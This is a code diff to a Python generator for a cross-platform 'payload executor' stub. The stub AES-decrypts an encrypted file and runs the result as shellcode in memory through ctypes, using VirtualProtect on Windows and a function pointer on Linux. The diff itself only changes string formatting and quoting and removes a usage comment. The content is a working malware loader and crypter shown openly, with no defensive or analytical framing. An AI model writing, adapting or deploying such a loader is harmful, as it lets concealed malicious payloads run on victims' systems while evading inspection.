@@ -1,7 +1,7 @@
 import binascii
 import platform
 
-STUB_TEMPLATE = """#!/usr/bin/env python3
+STUB_TEMPLATE = '''#!/usr/bin/env python3
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 import binascii
@@ -43,11 +43,11 @@ def execute_windows(shellcode):
     try:
         buffer = ctypes.create_string_buffer(shellcode)
         ctypes.windll.kernel32.VirtualProtect(
-            buffer, len(shellcode), 0x40, ctypes.byref(ctypes.c_ulong(0))
+            buffer, len(shellcode), 0x40, ctypes.byref(ctypes.c_ulong(0)))
         func = ctypes.cast(buffer, ctypes.CFUNCTYPE(None))
         func()
     except Exception as e:
-        print(f"[!] Windows execution failed: {e}")
+        print("[!] Windows execution failed: {0}".format(e))
         sys.exit(1)
 
 def execute_linux(shellcode):
@@ -62,30 +62,30 @@ def execute_linux(shellcode):
         function = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes_buffer))
         function()
     except Exception as e:
-        print(f"[!] Linux execution failed: {e}")
+        print("[!] Linux execution failed: {0}".format(e))
         sys.exit(1)
 
 if __name__ == "__main__":
     print("[*] Starting cross-platform payload executor")
-    print(f"[*] Detected OS: {platform.system()}")
+    print("[*] Detected OS: {0}".format(platform.system()))
 
     try:
         decrypted = decrypt_payload()
-        print(f"[+] Payload decrypted ({len(decrypted)} bytes)")
+        print("[+] Payload decrypted ({0} bytes)".format(len(decrypted)))
 
         if platform.system() == "Windows":
             execute_windows(decrypted)
         elif platform.system() == "Linux":
             execute_linux(decrypted)
         else:
-            print(f"[!] Unsupported OS: {platform.system()}")
+            print("[!] Unsupported OS: {0}".format(platform.system()))
             sys.exit(1)
 
     except Exception as e:
-        print(f"[!] Critical error: {e}")
+        print("[!] Critical error: {0}".format(e))
         print("[*] Decrypted payload saved to 'decrypted.bin'")
         sys.exit(1)
-"""
+'''
 
 
 def generate_decryptor(encrypted_file, obfuscated_key_hex, xor_key_hex):
@@ -102,9 +102,6 @@ def generate_decryptor(encrypted_file, obfuscated_key_hex, xor_key_hex):
         os.chmod("decryptor.py", 0o755)
 
     print("[+] Cross-platform decryptor generated:")
-    print(f"    - File: decryptor.py")
-    print(f"    - XOR Key: {xor_key_hex}")
-    print(f"    - Target: {encrypted_file}")
-
-# Örnek kullanım:
-# generate_decryptor("encrypted.bin", "1a2b3c...", "4d5e6f...")
+    print("    - File: decryptor.py")
+    print("    - XOR Key: {0}".format(xor_key_hex))
+    print("    - Target: {0}".format(encrypted_file))
